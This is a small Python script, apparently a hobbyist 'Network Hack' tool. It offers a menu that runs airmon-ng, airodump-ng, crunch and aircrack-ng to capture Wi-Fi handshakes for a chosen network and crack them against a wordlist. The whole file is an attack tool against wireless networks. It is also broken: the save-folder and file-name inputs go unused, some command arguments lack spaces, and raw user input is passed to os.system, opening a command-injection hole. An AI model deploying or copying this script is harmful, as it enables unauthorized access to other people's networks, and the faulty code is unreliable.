import os

os.system("apt-get install figlet")
os.system("clear")
os.system("figlet Network Hack")

question = input("""
1)capture handshake
2)look at a networks
3)create a wordlist
4)crack hash
>""")

if question == "1":
    a1 = input("bssid:")
    b1 = input("channel:")
    a = input("save folder:")
    b = input("handshake name:")
    os.system("airmon-ng start wlan0")
    os.system("airodump-ng --bssid "+a1+" --channel "+b1+" wlan0mon")
elif question == "2":
    os.system("airmon-ng start wlan0")
    os.system("airodump-ng wlan0mon")
elif question == "3":
    c1 = input("Major and minor digits 0 0 : ")
    d1 = input("The letters and numbers you want used : ")
    os.system("crunch "+c1 +d1)
elif question == "4":
    c = input("handshake:")
    d = input("wordlist:")
    os.system("aircrack-ng "+c+"-w "+d)
else:
    print("this operation not found!!!")